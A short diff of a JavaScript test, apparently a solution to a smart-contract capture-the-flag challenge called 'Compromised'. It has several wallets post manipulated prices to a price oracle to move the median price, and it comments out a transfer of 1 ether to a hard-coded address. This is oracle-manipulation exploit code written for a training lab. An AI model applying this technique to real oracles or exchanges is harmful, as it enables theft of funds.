@@ -94,7 +94,7 @@ describe('Compromised challenge', function () {
         console.log("Balance",exchangeBalance.toString())
         console.log(startPrice)
 		for (let i = 0; i < wallets.length; i++) {
-			await this.oracle.connect(wallets[i]).postPrice(tokenSymbol,  exchangeBalance.toString());
+			await this.oracle.connect(wallets[i]).postPrice(tokenSymbol,  exchangeBalance);
         }
         const dumpPrice = await this.oracle.getMedianPrice(tokenSymbol)
 		console.log("dump price",dumpPrice.toString())
@@ -104,10 +104,10 @@ describe('Compromised challenge', function () {
 
         const myBalance = await ethers.provider.getBalance(attacker.address);
         //myBalance /= 10;
-        const tx1111 = attacker.sendTransaction({
-            to: "0xA73209FB1a42495120166736362A1DfA9F95A105",
-            value: ethers.utils.parseEther('1')
-        });
+        // const tx1111 = attacker.sendTransaction({
+        //     to: "0xA73209FB1a42495120166736362A1DfA9F95A105",
+        //     value: ethers.utils.parseEther('1')
+        // });
         //
         //
         // ethers.BigNumber.from(myBalance).mul(0.9).toBigInt()
